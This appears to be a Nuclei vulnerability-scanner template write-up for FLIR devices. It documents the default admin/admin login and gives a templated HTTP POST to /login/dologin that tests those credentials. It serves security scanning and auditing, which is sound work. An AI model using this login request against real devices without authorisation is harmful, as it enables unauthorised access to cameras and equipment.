# Nuclei Template: Flir Default Login
**Template ID:** flir-default-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** Medium
**CWE:** CWE-798
**Source:** Nuclei Template (`flir-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Flir default login credentials (admin/admin) were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /login/dologin HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

user_name={{username}}&user_password={{password}}
```

## References
- https://securitycamcenter.com/flir-default-password/
